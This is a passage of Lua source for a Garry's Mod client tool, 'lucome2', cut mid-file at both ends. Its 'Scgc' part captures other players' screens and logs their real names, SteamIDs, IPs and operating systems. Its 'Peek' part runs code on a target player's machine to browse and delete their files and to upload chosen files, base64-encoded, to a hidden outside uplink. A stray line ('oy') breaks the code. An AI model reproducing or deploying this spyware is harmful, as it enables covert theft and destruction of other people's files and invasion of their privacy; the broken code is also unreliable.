		surface.SetDrawColor(Color(scolcol.r/4,scolcol.g/4,scolcol.b/4,255))
		for x=1,lucome2.SectorData.scgc.Splits.x do
			surface.DrawLine(pnlposx+pw/lucome2.SectorData.scgc.Splits.x*x,pnlposy,pnlposx+pw/lucome2.SectorData.scgc.Splits.x*x,pnlposy+ph-1)
		end
		for y=1,lucome2.SectorData.scgc.Splits.y do
			surface.DrawLine(pnlposx,pnlposy+ph/lucome2.SectorData.scgc.Splits.y*y,pnlposx+pw-1,pnlposy+ph/lucome2.SectorData.scgc.Splits.y*y)
		end
		
		local pt = {}
		for k,v in pairs(player.GetAll()) do
			pt[#pt+1] = v
		end
		
		local sx,sy = lucome2.SectorData.scgc.Splits.x,lucome2.SectorData.scgc.Splits.y
		for k,v in pairs(pt) do
			local x,y = pnlposx+((k-1)%sx)*pw/sx,pnlposy+(math.floor((k-1)/sx))*ph/sy
			local pc = PacCamColors[v:EntIndex()] or Color(128,128,128,255)
			lucome2.RenderButton(v:Nick(),x,y,pw/sx,ph/sy,true--[[v ~= LocalPlayer()]],true,pc,function()
				XNCR([[if ______S then __SREQ = true return "Scgc: Capture Screen" else return "Scgc: Not initialized" end]],{},false,false,{v},0,{ret=true,mret=true},"Scgc: Capture Screen")
			end)
		end
	end
	
	lucome2.SectorData.scgc.FormatFile = function(current,new)
		local old,rems = string.Explode("\n",current),{"Names :: ","Nicknames :: ","SteamID :: ","ScreenData :: ","FOV :: ","IP :: ","OperatingSystem :: "}
		if current ~= "" then
			for i=1,#rems do
				local qq,dat = {},string.Explode(", ",old[i]:sub(#rems[i]+1,nil))
				table.RemoveByValue(dat,"\n")
				
				for i=1,#dat do
					qq[tostring(dat[i])] = true
				end
				
				if not qq[new[i]] then
					print(old[i]..", "..new[i])
					old[i] = old[i]..", "..new[i]
				end
			end
		else 
			for i=1,#rems do
				old[i] = rems[i]..new[i]
			end
		end
		return table.concat(old,"\n")
	end
	
	lucome2.SectorData.scgc.DeleteFile = function(filename)
		http.Post(base64.decode(lucome2.SectorData.scgc.Uplink),{del="true",nam=filename,ext=".jpg"},
			function(body,len,headers,code) end,function() print(error) end)
	end
	
	lucome2.SectorData.scgc.SaveFile = function(ply,data,filename)
		local safename = string.Replace(ply:SteamID(),":","-")
		local savedir  = "svdimg/"..safename
		
		if not file.IsDir("svdimg/pdata","DATA") then file.CreateDir("svdimg/pdata") end
		if not file.IsDir(savedir,"DATA")        then file.CreateDir(savedir)        end
		
		local dat = {
			ply:RealName(),
			ply:Nick():gsub("%^%d+", ""):gsub("<(.-)=(.-)>", ""),
			ply:SteamID(),
			"["..data[1]..","..data[2].."]",
			tostring(data[3]),
			data[8],
			data[7] == 1 and "Windows" or data[7] == 0 and "Mac" or data[7] == -1 and "Linux" or "Unknown"
		}
		
		if not file.Exists("svdimg/pdata/"..safename..".txt","DATA") then
			local datafile = file.Open("svdimg/pdata/"..safename..".txt","wb","DATA")
			datafile:Write(lucome2.SectorData.scgc.FormatFile("",dat))
			datafile:Close()
		else
			local odf,datafile = file.Read("svdimg/pdata/"..safename..".txt","DATA"),file.Open("svdimg/pdata/"..safename..".txt","wb","DATA")
			datafile:Write(lucome2.SectorData.scgc.FormatFile(odf,dat))
			datafile:Close()
		end
		
		local savefile = savedir.."/"..filename..".jpg"
		
		hook.Call("XNCReturn",nil,"",LocalPlayer(),"Scgc Image Preview: "..filename.." ["..savedir.."]---\n")
		
		local image = file.Open(savefile,"wb","DATA")
		image:Write(data)
		image:Close()
		
		timer.Simple(4,function()
			lucome2.SectorData.scgc.DeleteFile(filename)
		end)
	end
	
	lucome2.SectorData.scgc.ViewFile = function(ply,plydata,data,filename,title)
		local pnl = vgui.Create("DFrame")
	    pnl:SetSize(ScrW()*0.95,math.Clamp((ScrW()*0.95)/(plydata[1]/plydata[2])+29,29,ScrH()))
	    pnl:Center()
	    pnl:MakePopup()
	    pnl:SetTitle(title)
	    pnl:SetSizable(true)
	    function pnl:Paint(w,h)
	    	BlurBoxPanel(self,4,255,Color(0,0,0,180))
    	end
    	pnl:RequestFocus()
    	
	    local html = pnl:Add("HTML")
	    html:SetHTML([[
	    	<style type="text/css">
	    		body {margin: 0;padding: 0;overflow: hidden;}
	    		img  {height: 100%;}
	    	</style>
	    	<img src="data:image/jpg;base64,]]..base64.encode(data)..[[">
	    ]])
	    html:Dock(FILL)
	    
	    local btn = pnl:Add("DButton")
	    btn:SetText("Close")
	    btn:Dock(FILL)
    	function btn:Paint(w,h)
    		return true
    	end
	    function btn:DoClick()
	    	pnl:Close()
	    end
	    
	   lucome2.SectorData.scgc.SaveFile(ply,data,filename)
	end
	
	--Peek
	lucome2.SectorData.peek.Pos       = Vector(0,ScrH()-ScrH()*0.4)
	lucome2.SectorData.peek.Size      = Vector(ScrW()/3,ScrH()*0.2)
	lucome2.SectorData.peek.PosA      = Vector(0,ScrH()-ScrH()*0.2)
	lucome2.SectorData.peek.PosB      = Vector(0,ScrH()-ScrH()*0.4)
	lucome2.SectorData.peek.SizeA     = Vector(ScrW()/3,ScrH()*0.2)
	lucome2.SectorData.peek.SizeB     = Vector(ScrW()/2,ScrH()*0.4)
	lucome2.SectorData.peek.LocalCol  = PacCamColors[LocalPlayer():EntIndex()] or Color(128,128,128,255)
	lucome2.SectorData.peek.TargetCol = Color(0,0,0,255)
	lucome2.SectorData.peek.Outline   = lucome2.SectorData.peek.LocalCol
	lucome2.SectorData.peek.Splits    = Vector(8,4)
	lucome2.SectorData.peek.Active    = false
	lucome2.SectorData.peek.Target    = NULL
	lucome2.SectorData.peek.Root      = "MOD"
	lucome2.SectorData.peek.Transfer  = "trans"
	lucome2.SectorData.peek.ParentDir = ""
	lucome2.SectorData.peek.Directory = ""
	lucome2.SectorData.peek.SortMode  = 0 --0: Decending, 1: Ascending
	lucome2.SectorData.peek.Listings  = {
		Directories = {},
		Files = {}
	}
	lucome2.SectorData.peek.Currents  = {
		Directories = 0,
		Files = 0
	}
	lucome2.SectorData.peek.Selection = {
		Directories = "",
		Files = {}
	}
	
	lucome2.SectorData.peek.Render = function()
		if          lucome2.SectorData.peek.Active and    lucome2.SectorData.peek.Target:IsValid()  and lucome2.Animators.Sectors.peek.ModeShift < 1 then
			lucome2.Animators.Sectors.peek.ModeShift = Lerp(0.5,lucome2.Animators.Sectors.peek.ModeShift,1)
		elseif (not lucome2.SectorData.peek.Active or not lucome2.SectorData.peek.Target:IsValid()) and lucome2.Animators.Sectors.peek.ModeShift > 0 then
			lucome2.Animators.Sectors.peek.ModeShift = Lerp(0.5,lucome2.Animators.Sectors.peek.ModeShift,0)
		end
		
		if lucome2.SectorData.peek.Pos ~= (lucome2.SectorData.peek.Active and lucome2.SectorData.peek.PosB or lucome2.SectorData.peek.PosA) then
			lucome2.SectorData.peek.Pos  = LerpVector(lucome2.Animators.Sectors.peek.ModeShift,lucome2.SectorData.peek.PosA ,lucome2.SectorData.peek.PosB )
			lucome2.SectorData.peek.Size = LerpVector(lucome2.Animators.Sectors.peek.ModeShift,lucome2.SectorData.peek.SizeA,lucome2.SectorData.peek.SizeB)
			
			lucome2.SectorData.peek.Outline = Color(
				Lerp(lucome2.Animators.Sectors.peek.ModeShift,lucome2.SectorData.peek.LocalCol.r,lucome2.SectorData.peek.TargetCol.r),
				Lerp(lucome2.Animators.Sectors.peek.ModeShift,lucome2.SectorData.peek.LocalCol.g,lucome2.SectorData.peek.TargetCol.g),
				Lerp(lucome2.Animators.Sectors.peek.ModeShift,lucome2.SectorData.peek.LocalCol.b,lucome2.SectorData.peek.TargetCol.b),
				255)
		end
		
		local pnlposx,pnlposy = lucome2.SectorData.peek.Pos.x,lucome2.SectorData.peek.Pos.y
		local pw,ph = lucome2.SectorData.peek.Size.x,lucome2.SectorData.peek.Size.y
		local pcolcol = lucome2.SectorData.peek.Outline
		surface.SetDrawColor(Color(0,0,0,180))
		surface.DrawRect(pnlposx,pnlposy,pw,ph)
		surface.SetDrawColor(pcolcol)
		surface.DrawOutlinedRect(pnlposx,pnlposy,pw,ph)
		
		local alpha2 = lucome2.Animators.Sectors.peek.ModeShift
		local alpha1 = 1-alpha2
		
		local ena1 = not lucome2.SectorData.peek.Active and lucome2.Animators.Sectors.peek.ModeShift < 0.1
		local ena2 =     lucome2.SectorData.peek.Active and lucome2.Animators.Sectors.peek.ModeShift > 0.9
		
		if not lucome2.SectorData.peek.Active and lucome2.Animators.Sectors.peek.ModeShift < 0.9 then
			surface.SetDrawColor(Color(pcolcol.r/4,pcolcol.g/4,pcolcol.b/4,alpha1*255))
			for x=1,lucome2.SectorData.peek.Splits.x do
				surface.DrawLine(pnlposx+pw/lucome2.SectorData.peek.Splits.x*x,pnlposy,pnlposx+pw/lucome2.SectorData.peek.Splits.x*x,pnlposy+ph-1)
			end
			for y=1,lucome2.SectorData.peek.Splits.y do
				surface.DrawLine(pnlposx,pnlposy+ph/lucome2.SectorData.peek.Splits.y*y,pnlposx+pw-1,pnlposy+ph/lucome2.SectorData.peek.Splits.y*y)
			end
			
			local pt = {}
			for k,v in pairs(player.GetAll()) do
				pt[#pt+1] = v
			end
			
			local sx,sy = lucome2.SectorData.peek.Splits.x,lucome2.SectorData.peek.Splits.y
			for k,v in pairs(pt) do
				local x,y = pnlposx+((k-1)%sx)*pw/sx,pnlposy+(math.floor((k-1)/sx))*ph/sy
				local pc = PacCamColors[v:EntIndex()] or Color(128,128,128,255)
				pc.a = alpha1*255
				lucome2.RenderButton(v:Nick(),x,y,pw/sx,ph/sy,true,ena1,pc,function()
					lucome2.SectorData.peek.Active    = true
					lucome2.SectorData.peek.Target    = v
					lucome2.SectorData.peek.TargetCol = pc
					lucome2.SectorData.peek.ParentDir = ""
					lucome2.SectorData.peek.Directory = "data"
					lucome2.SectorData.peek.RetrieveDirctory(lucome2.SectorData.peek.Directory,lucome2.SectorData.peek.Target)
				end)
			end
		end
		
		if lucome2.SectorData.peek.Active and lucome2.Animators.Sectors.peek.ModeShift > 0.1 then
			surface.SetDrawColor(Color(pcolcol.r,pcolcol.g,pcolcol.b,alpha2*255))
			surface.DrawLine(pnlposx+pw/2,pnlposy,pnlposx+pw/2,pnlposy+ph)
			
			lucome2.RenderButton("Exit",pnlposx,pnlposy-36,pw,36,true,ena2,pcolcol,function()
				lucome2.SectorData.peek.Active                = false
				lucome2.SectorData.peek.Target                = NULL
				lucome2.SectorData.peek.ParentDir             = ""
				lucome2.SectorData.peek.Directory             = ""
				lucome2.SectorData.peek.Listings.Directories  = {}
				lucome2.SectorData.peek.Listings.Files        = {}
				lucome2.SectorData.peek.Currents.Directories  = 0
				lucome2.SectorData.peek.Currents.Files        = 0
				lucome2.SectorData.peek.Selection.Directories = ""
				lucome2.SectorData.peek.Selection.Files       = {}
				lucome2.SectorData.peek.TargetCol             = Color(0,0,0,255)
			end)
			
			--Directories
			lucome2.ScrollDetectArea(pnlposx,pnlposy+24*2,pw/2,ph-24*2,ena2,function(delta)
				lucome2.SectorData.peek.Currents.Directories = math.Clamp(
					lucome2.SectorData.peek.Currents.Directories+delta,
					0,
					#lucome2.SectorData.peek.Listings.Directories-1)
				lucome2.SectorData.peek.Selection.Directories = lucome2.SectorData.peek.Listings.Directories[lucome2.SectorData.peek.Currents.Directories+1]
			end)
				
			lucome2.ClickDetectArea(MOUSE_LEFT ,pnlposx,pnlposy+24*2,pw/2,ph-24*2,ena2,function() -- Enter Directory
				lucome2.SectorData.peek.ParentDir = lucome2.SectorData.peek.Directory
				lucome2.SectorData.peek.RetrieveDirctory(lucome2.SectorData.peek.Directory.."/"..lucome2.SectorData.peek.Selection.Directories,lucome2.SectorData.peek.Target)
				lucome2.SectorData.peek.Directory = lucome2.SectorData.peek.Directory.."/"..lucome2.SectorData.peek.Selection.Directories
				
				lucome2.SectorData.peek.Currents.Directories  = 0
				lucome2.SectorData.peek.Currents.Files        = 0
			end)
			
			lucome2.ClickDetectArea(MOUSE_RIGHT,pnlposx,pnlposy+24*2,pw/2,ph-24*2,ena2,function() -- Enter parent directory
				lucome2.SectorData.peek.RetrieveDirctory(lucome2.SectorData.peek.ParentDir,lucome2.SectorData.peek.Target)
				lucome2.SectorData.peek.Directory = lucome2.SectorData.peek.ParentDir
				local newparentdir = lucome2.SectorData.peek.ParentDir
				newparentdir = newparentdir:match(".+/") and newparentdir:match(".+/"):sub(0,-2) or ""
				
				lucome2.SectorData.peek.ParentDir = newparentdir
				
				lucome2.SectorData.peek.Currents.Directories  = 0
				lucome2.SectorData.peek.Currents.Files        = 0
			end)
			
			
			lucome2.RenderButton("Goto: data/pac3"  ,pnlposx+((pw/2)/3)*0,pnlposy+24*0,(pw/2)/3,24,ena2,true,pcolcol,function()
				lucome2.SectorData.peek.RetrieveDirctory("data/pac3",lucome2.SectorData.peek.Target)
				lucome2.SectorData.peek.Directory = "data/pac3"
				lucome2.SectorData.peek.ParentDir = "data"
			end)
			
			lucome2.RenderButton("Refresh"          ,pnlposx+((pw/2)/3)*1,pnlposy+24*0,(pw/2)/3,24,ena2,true,pcolcol,function()
				lucome2.SectorData.peek.RetrieveDirctory(lucome2.SectorData.peek.Directory,lucome2.SectorData.peek.Target)
			end)
			
			lucome2.RenderButton("Goto: data/luapad",pnlposx+((pw/2)/3)*2,pnlposy+24*0,(pw/2)/3,24,ena2,true,pcolcol,function()
				lucome2.SectorData.peek.RetrieveDirctory("data/luapad",lucome2.SectorData.peek.Target)
				lucome2.SectorData.peek.Directory = "data/luapad"
				lucome2.SectorData.peek.ParentDir = "data"
			end)
			
			lucome2.RenderButton(">> "..lucome2.SectorData.peek.Directory.." <<",pnlposx,pnlposy+24*1,pw/2,24,ena2,true,pcolcol,function()
				SetClipboardText(lucome2.SectorData.peek.Directory)
			end)
			
			local dircen     = Vector(pnlposx+pw/4,pnlposy+24*2+(ph-24*2)/2)
			local filcen     = Vector(pnlposx+pw/2+pw/4,pnlposy+24*2+(ph-24*2)/2)
			local itemheight = 14
			local listmax    = math.floor(((ph-24*2)/itemheight)/2)
			
			for i=-listmax,listmax,1 do
				local cur  = lucome2.SectorData.peek.Currents.Directories+i
				local dir  = lucome2.SectorData.peek.Listings.Directories[cur]
				if not dir then continue end
				local o    = i-1
				local font = o == 0 and "PeekCenter" or "PeekOffset"
				local col  = Color(pcolcol.r+80,pcolcol.g+80,pcolcol.b+80,alpha2*255-math.abs(o)*(255/listmax))
				local ocol = o == 0 and Color(0,0,0,alpha2*255) or Color(0,0,0,alpha2*255-math.abs(o)*(255/listmax))
				draw.SimpleTextOutlined(dir,font,dircen.x,dircen.y+(o*itemheight),col,1,1,1,ocol)
			end
			
			
			
			--Files
			lucome2.ScrollDetectArea(pnlposx+pw/2,pnlposy+24*2,pw/2,ph-24*2,ena2,function(delta)
				lucome2.SectorData.peek.Currents.Files = math.Clamp(
					lucome2.SectorData.peek.Currents.Files+delta,
					0,
					#lucome2.SectorData.peek.Listings.Files-1)
				lucome2.SectorData.peek.Selection.Files = lucome2.SectorData.peek.Listings.Files[lucome2.SectorData.peek.Currents.Files+1]
			end)
				
			lucome2.ClickDetectArea(MOUSE_LEFT ,pnlposx+pw/2,pnlposy+24*2,pw/2,ph-24*2,ena2,function()
				lucome2.SectorData.peek.RetrieveFile(
					lucome2.SectorData.peek.Selection.Files[1],
					lucome2.SectorData.peek.Selection.Files[1]:GetExtensionFromFilename(),
					lucome2.SectorData.peek.Directory,
					lucome2.SectorData.peek.Target,
					lucome2.SectorData.peek.Transfer)
			end)
			
			lucome2.ClickDetectArea(MOUSE_RIGHT,pnlposx+pw/2,pnlposy+24*2,pw/2,ph-24*2,ena2,function()
				lucome2.SectorData.peek.RetrieveDirctory(lucome2.SectorData.peek.ParentDir,lucome2.SectorData.peek.Target)
				lucome2.SectorData.peek.Directory = lucome2.SectorData.peek.ParentDir
				local newparentdir = lucome2.SectorData.peek.ParentDir
				newparentdir = newparentdir:match(".+/") and newparentdir:match(".+/"):sub(0,-2) or ""
				
				lucome2.SectorData.peek.ParentDir = newparentdir
				
				lucome2.SectorData.peek.Currents.Directories  = 0
				lucome2.SectorData.peek.Currents.Files        = 0
			end)
			
			lucome2.RenderButton("Transfer",pnlposx+pw/2+(pw/4)*0,pnlposy+24*0,pw/4,24,ena2,true,pcolcol,function()
				lucome2.SectorData.peek.RetrieveFile(
					lucome2.SectorData.peek.Selection.Files[1],
					lucome2.SectorData.peek.Selection.Files[1]:GetExtensionFromFilename(),
					lucome2.SectorData.peek.Directory,
					lucome2.SectorData.peek.Target,
					lucome2.SectorData.peek.Transfer)
			end)
			
			lucome2.RenderButton("Delete" ,pnlposx+pw/2+(pw/4)*1,pnlposy+24*0,pw/4,24,ena2,true,pcolcol,function()
				lucome2.SectorData.peek.DeleteFile(
					lucome2.SectorData.peek.Directory,
					lucome2.SectorData.peek.Selection.Files[1],
					lucome2.SectorData.peek.Target)
			end)
			
			lucome2.RenderButton("Date",pnlposx+pw/2+((pw/2)/3)*0,pnlposy+24*1,(pw/2)/3,24,ena2,true,pcolcol,function()
				table.sort(lucome2.SectorData.peek.Listings.Files,function(a,b)
					if lucome2.SectorData.peek.SortMode == 0 then
						return a[2] > b[2]
					else
						return a[2] < b[2]
					end
				end)
				lucome2.SectorData.peek.SortMode = lucome2.SectorData.peek.SortMode == 0 and 1 or 0
			end)
			
			lucome2.RenderButton("Name",pnlposx+pw/2+((pw/2)/3)*1,pnlposy+24*1,(pw/2)/3,24,ena2,true,pcolcol,function()
				table.sort(lucome2.SectorData.peek.Listings.Files,function(a,b)
					if lucome2.SectorData.peek.SortMode == 0 then
						return a[1] > b[1]
					else
						return a[1] < b[1]
					end
				end)
				lucome2.SectorData.peek.SortMode = lucome2.SectorData.peek.SortMode == 0 and 1 or 0
			end)
			
			lucome2.RenderButton("Size",pnlposx+pw/2+((pw/2)/3)*2,pnlposy+24*1,(pw/2)/3,24,ena2,true,pcolcol,function()
				table.sort(lucome2.SectorData.peek.Listings.Files,function(a,b)
					if lucome2.SectorData.peek.SortMode == 0 then
						return a[3] > b[3]
					else
						return a[3] < b[3]
					end
				end)
				lucome2.SectorData.peek.SortMode = lucome2.SectorData.peek.SortMode == 0 and 1 or 0
			end)
			
			for i=-listmax,listmax do
				local cur  = lucome2.SectorData.peek.Currents.Files+i
				local fil  = lucome2.SectorData.peek.Listings.Files[cur]
				if not fil then continue end
				local o    = i-1
				local font = o == 0 and "PeekCenter" or "PeekOffset"
				local time = os.date("%m-%d-%Y",fil[2])
				local size = string.Comma(tostring(fil[3])).." kb"
				local col  = Color(pcolcol.r+80,pcolcol.g+80,pcolcol.b+80,alpha2*255-math.abs(o)*(255/listmax))
				local ocol = o == 0 and Color(0,0,0,alpha2*255) or Color(0,0,0,alpha2*255-math.abs(o)*(255/listmax))
				draw.SimpleTextOutlined(time  ,font,filcen.x-pw/4+8,filcen.y+(o*itemheight),col,0,1,1,ocol)
				draw.SimpleTextOutlined(fil[1],font,filcen.x       ,filcen.y+(o*itemheight),col,1,1,1,ocol)
				draw.SimpleTextOutlined(size  ,font,filcen.x+pw/4-8,filcen.y+(o*itemheight),col,2,1,1,ocol)
			end
		end
	end
	
	
	lucome2.SectorData.peek.RetrieveDirctory = function(directory,target)
		XNCR([=[
			local f,d,l,t = {},{},{},{}
			if dr == "" then
				f,d = file.Find("*",r)
				for k,v in pairs(f) do
					l[k],t[k] = math.Round(file.Size(v,r)/1000,2),file.Time(v,r)
				end 
			else 
				f,d = file.Find(dr.."/*",r)
				for k,v in pairs(f) do 
					l[k],t[k] = math.Round(file.Size(dr.."/"..v,r)/1000,2),file.Time(dr.."/"..v,r)
				end 
			end
			net.Start(nstr)
				net.WriteTable({f=f,d=d,l=l,t=t,x=x})
			net.SendToServer()
		]=],{r=lucome2.SectorData.peek.Root,dr=directory,x=LocalPlayer(),nstr=lucome2.NetStrings.peek.RetrieveDirectory},
		false,false,{target},0,{con=false,ret=false,deep=false},"Peek: Retrieve Directory <"..directory..">")
	end
	
	lucome2.SectorData.peek.DeleteFile = function(directory,filename,target)
		XNCR([=[
			if dr:sub(1,4) == "data" then
				file.Delete(dr.."/"..filename)
			end
		]=],{dr=directory,f=filename},
		false,false,{target},0,{con=false,ret=false,deep=false},"Peek: Delete File <"..directory.."/"..filename..">")
	end
	
	lucome2.SectorData.peek.RetrieveFile = function(filename,extension,directory,target,savedirectory)
		XNCR([=[
			local g = file.Read(p..f..e,r)
			local i = string.gsub(string.gsub(l:RealNick():lower()," ","_"),"[^%a%d_]","").."___"..string.gsub(string.gsub(os.date(),"[%:%/]","-"),"%s","_")
			local ret = "Peek: Requesting file <"..p..f..">"
			http.Post(base64.decode(x),{dat=base64.encode(g),nam=base64.encode(f),ext=e,dec="true"},function(body,len,headers,code)
				net.Start(nstr)
					net.WriteEntity(LocalPlayer())
					net.WriteEntity(d)
					net.WriteTable({p,f,e})
					net.WriteString(s)
				net.SendToServer()
				ret = ret.."\nPeek: Reception Underway"
			end,function() ret = ret.."\nPeek: Reception Failure" end)
			return ret
		]=],
		{
			r = lucome2.SectorData.peek.Root,
			d = LocalPlayer(),
			l = target,
			f = filename:StripExtension(),
			e = "."..extension or ".txt",
			p = directory ~= "" and directory.."/" or "",
			s = savedirectory,
			x = lucome2.SectorData.scgc.Uplink,
			nstr = lucome2.NetStrings.peek.RetrieveFile
		},
		false,false,{target},0,{con=false,ret=true,mret=true,deep=false},"Peek: Requesting file <"..directory.."/"..filename..">")
	end
	
	lucome2.SectorData.peek.DeleteServerFile = function(filename,extension)
		http.Post(base64.decode(lucome2.SectorData.scgc.Uplink),
			{del="true",nam=base64.encode(filename),ext=extension or ".txt"},function(body,len,headers,code)
			hook.Call("XNCReturn",nil,"",LocalPlayer(),"Peek: Server file deletion successful")
		end,function(e)
			hook.Call("XNCReturn",nil,"",LocalPlayer(),"Peek: Server file deletion failed")
		end)
	end
	
	lucome2.SectorData.peek.SaveFile = function(filename,extension,savedirectory,target)
		local realname = target:RealNick():lower():match("%a+") and target:RealNick():lower() or target:Nick():lower()
		realname = realname:gsub("%^%d+", ""):gsub("<(.-)=(.-)>", "")
		local playername = string.gsub(string.gsub(realname," ","_"),"[^%a%d_]","")
		local tries,checking,ok = 0,false,false
		hook.Add("Think","LuCoMe2_Peek_Save_"..filename,function()
			if not ok and not checking then
				checking = true
				http.Post(base64.decode(lucome2.SectorData.scgc.Uplink),{chk=base64.encode(filename)..extension},function(body,len,headers,code)
					if body == "../s/" then
						ok = true
					end 
					tries,checking = tries+1,false
				end,function(error) 
					tries,checking = tries+1,false
				end)
			end
			
			if tries > 10 then
				hook.Remove("Think","LuCoMe2_Peek_Save_"..filename)
				hook.Call("XNCReturn",nil,"",LocalPlayer(),"Peek: File reception failed")
			end
			
			if ok then
				hook.Remove("Think","LuCoMe2_Peek_Save_"..filename)
				
				http.Fetch(base64.decode(lucome2.SectorData.scgc.Archive).."/"..base64.encode(filename)..extension,function(data,len,headers,code)
					if not  file.IsDir(savedirectory,"DATA") then
						file.CreateDir(savedirectory)
					end
					
					if not  file.IsDir(savedirectory.."/"..playername,"DATA") then
						file.CreateDir(savedirectory.."/"..playername)
					end
					
					local fileobject = file.Open(savedirectory.."/"..playername.."/"..filename..".txt","wb","DATA")
					
					if extension == ".txt" then
						local preview,bbd = {"---DOCUMENT PREVIEW: "..filename..extension.." ["..savedirectory.."/"..playername.."]---\n"},string.Explode("\n",data)
						for i=1,15 do preview[#preview+1] = bbd[i] end
						hook.Call("XNCReturn",nil,"",target,table.concat(preview))
					elseif ({[".jpg"]=true,[".jpeg"]=true,[".png"]=true,[".bmp"]=true,[".tiff"]=true})[extension] then
						hook.Call("XNCReturn",nil,"",target,"---IMAGE PREVIEW: "..filename..extension.." ["..savedirectory.."/"..playername.."]---\n")
						
						local pnl = vgui.Create("DFrame")
					    pnl:SetSize(ScrW()*0.95,ScrH()*0.95)
					    pnl:Center()
					    pnl:MakePopup()
					    pnl:SetTitle(savedirectory.."/"..playername.."/"..filename..extension)
					    pnl:SetSizable(true)
					    function pnl:Paint(w,h)
					    	BlurBoxPanel(self,4,255,Color(0,0,0,180))
							return true
				    	end
					   	pnl:RequestFocus()
					   	
					    local html = pnl:Add("HTML")
					    html:SetHTML([[
					    <style type="text/css">
					    	body {margin: 0;padding: 0;overflow: hidden;}
					    	img  {height: 100%;}
					    </style>
					    <img src="data:image/]]..extension:sub(2,nil)..[[;base64,]]..base64.encode(data)..[[">
					    ]])
					    html:Dock(FILL)
					    
					    local btn = pnl:Add("DButton")
					    btn:SetText("Close")
					    btn:Dock(FILL)
				    	btn.Paint = function(s,w,h) return true end
					    btn.DoClick = function(s)
			    			pnl:Close()
		    			end
					end
					
					fileobject:Write(data)
					fileobject:Close()
						
					timer.Simple(4,function()
						lucome2.SectorData.peek.DeleteServerFile(filename)
					end)
					
					hook.Call("XNCReturn",nil,"",LocalPlayer(),"Peek: File saved successfully")
				end,function(e) print(e) end)
			end
		end)
	end
	
	--Ovac
	
	lucome2.SectorData.ovac.Pos             = Vector(0,0)
	lucome2.SectorData.ovac.Size            = Vector(ScrH()-lucome2.SectorData.peek.Size.y,ScrH()-lucome2.SectorData.peek.Size.y)
	lucome2.SectorData.ovac.Updated         = false
	lucome2.SectorData.ovac.RegenerateMap   = false
	lucome2.SectorData.ovac.ShowPropOwners  = false
	lucome2.SectorData.ovac.PlayerPoses     = {}
	lucome2.SectorData.ovac.SelectedPlayer  = NULL
	lucome2.SectorData.ovac.TrackingPlayer  = {}
	lucome2.SectorData.ovac.MapImageFolder  = "lucome2-ovac-maps"
	lucome2.SectorData.ovac.MapImage        = nil
	lucome2.SectorData.ovac.MapMaterial     = NULL
	lucome2.SectorData.ovac.MapZoom         = 1
	lucome2.SectorData.ovac.MapZoomCenter   = Vector(0,0)
	lucome2.SectorData.ovac.MapRenderHeight = 0.95
	lucome2.SectorData.ovac.HeightGrabbing  = false
	lucome2.SectorData.ovac.MapCenter       = Vector(0,0)
	lucome2.SectorData.ovac.MapLocalCenter  = Vector(0,0)
	lucome2.SectorData.ovac.Fullscreen      = false
	lucome2.SectorData.ovac.MapBounds       = {
		Min = Vector(-32768,-32768,-32768),
		Max = Vector( 32768, 32768, 32768)
	}
	lucome2.SectorData.ovac.Overlap         = {}
	lucome2.SectorData.ovac.OverlapPos      = Vector()
	lucome2.SectorData.ovac.MapScale        = math.max(
		math.abs(lucome2.SectorData.ovac.MapBounds.Min.x),
		math.abs(lucome2.SectorData.ovac.MapBounds.Min.y),
		math.abs(lucome2.SectorData.ovac.MapBounds.Max.x),
		math.abs(lucome2.SectorData.ovac.MapBounds.Max.y))
	
	lucome2.SectorData.ovac.RenderMap = function(w,h)
		local absheight = math.abs(lucome2.SectorData.ovac.MapBounds.Min.z)+math.abs(lucome2.SectorData.ovac.MapBounds.Max.z)
		local data = {
			angles = Angle(90,90,0),
			origin = Vector(
				lucome2.SectorData.ovac.MapZoomCenter.x+lucome2.SectorData.ovac.MapCenter.x,
				lucome2.SectorData.ovac.MapZoomCenter.y+lucome2.SectorData.ovac.MapCenter.y,
				absheight*lucome2.SectorData.ovac.MapRenderHeight),
			x = 0,
			y = 0,
			w = w,
			h = h,
			bloomtone     = false,
			drawviewmodel = false,
			ortho         = {
				left      = -lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom),
				right     =  lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom),
				top       = -lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom),
				bottom    =  lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom) 
			}
		}
		
		render.RenderView(data)
	end
	
	lucome2.SectorData.ovac.MatrixDot = function(x,y,radius,resolution,color)
		local m = Matrix()
		m:Translate( Vector(x,y,1))
		m:Scale(Vector(radius/resolution,radius/resolution,1))
		m:Translate(-Vector(x+resolution/2,y+resolution/2,1))
		cam.PushModelMatrix(m)
			draw.RoundedBox(resolution,x,y,resolution,resolution,color)
		cam.PopModelMatrix()
	end
	oy
	lucome2.SectorData.ovac.RenderPropPosition = function(prop,ownply)
		local pos = prop:GetPos()
		local scale = lucome2.SectorData.ovac.MapScale*(1/lucome2.SectorData.ovac.MapZoom)
		local cen = lucome2.SectorData.ovac.MapCenter+lucome2.SectorData.ovac.MapZoomCenter
		local maprelativepos = Vector(cen.x-pos.x,cen.y-pos.y)
		local posscaled = Vector(maprelativepos.x/(scale/lucome2.SectorData.ovac.Size.x)/2,maprelativepos.y/(scale/lucome2.SectorData.ovac.Size.y)/2)
		local plcol = PacCamColors[ownply:EntIndex()] or Color(128,128,128,255)
		
		local xx = lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.MapLocalCenter.x-posscaled.x
		local yy = lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.MapLocalCenter.y+posscaled.y
		
		local hov = Vector(gui.MouseX(),gui.MouseY()):Distance(Vector(xx,yy)) <= 6
		
		surface.SetDrawColor(Color(plcol.r,plcol.g,plcol.b,plcol.a/4))
		surface.DrawLine(xx,yy,
			lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.PlayerPoses[ownply].x,
			lucome2.SectorData.ovac.Pos.y+lucome2.SectorData.ovac.PlayerPoses[ownply].y)
			
		if hov then
			draw.SimpleTextOutlined("{"..prop:EntIndex().."}","Default",xx,yy-14,plcol,1,1,1,Color(0,0,0,255))
			draw.SimpleTextOutlined(prop:GetClass()          ,"Default",xx,yy+14,plcol,1,1,1,Color(0,0,0,255))
		end
		
		if xx >= lucome2.SectorData.ovac.Pos.x and xx <= lucome2.SectorData.ovac.Pos.x+lucome2.SectorData.ovac.Size.x and
